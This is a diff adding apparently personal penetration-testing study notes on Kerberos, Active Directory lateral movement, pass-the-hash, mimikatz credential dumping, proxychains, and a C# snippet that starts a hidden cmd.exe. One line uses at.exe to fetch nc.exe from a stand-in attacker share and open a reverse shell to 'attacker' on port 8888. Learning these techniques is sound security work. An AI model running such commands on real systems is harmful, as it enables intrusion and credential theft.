@@ -37,6 +37,7 @@ https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
 Kerberos
 https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberos-authentication
 
+<<<<<<< HEAD
 Firstly, Kerberos is an authentication protocol, not authorization. In other words, it allows to identify each user, who provides a secret password, however, it does not validates to which resources or services can this user access.
 
 Agents
@@ -59,6 +60,87 @@ The TGS (Ticket Granting Service) is the ticket which user can use to authentica
 The TGT (Ticket Granting Ticket) is the ticket presented to the KDC to request for TGSs. It is encrypted with the KDC key.
 
 
+# lateral movement
+
+https://hackmag.com/security/lateral-guide/
+
+approach
+
+sieze control over the domain controllers
+reach to isolated critical network segments
+search for critical information stored in a certain PC
+
+impacket tools
+MSRPC - smb via named pipes
+psexec.exe - no av risk, legitimate
+psexec.py - from impacket or services.py for manual entering of commands
+winexe
+smbexec.py - just for msrp.py
+atexec.py/ at.exe this helps in remote schedule tasks
+`at.exe \\target 13:37 "cmd /c copy \\attacker\a\nc.exe && nc -e \windows\system32\cmd.exe attacker 8888"`
+reg.exe - writing to registry remotely
+dcomexec.py - wmiexec
+wmi
+sc.exe
+winrm - evilwinrm
+winrs.exe and powershell
+xfreerdp
+GP
+
+### Pass the hash
+
+without cracking the password we can get:
+
+![](2022-08-23-06-34-31.png)
+
+kali linux has many pth - pass the hash tools
+
+
+# dumping credentials with mimikatz
+
+https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/
+
+windows defender credential Guard prevents access to LSASS
+
+
+
+![](2022-08-23-06-25-06.png)
+
+
+
+# proxychain
+open `/etc/proxychains.conf`
+add `socks5 ip port username password` to the end
+run with `proxychains ping whatever`
+
+or using foxy proxy to set up a proxy
+
+# C# execution of commands
+
+```C#
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace console_csharp
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "";
+            process.StartInfo = startInfo;
+            process.Start();
+        }
+    }
+}
+```
 
 
 
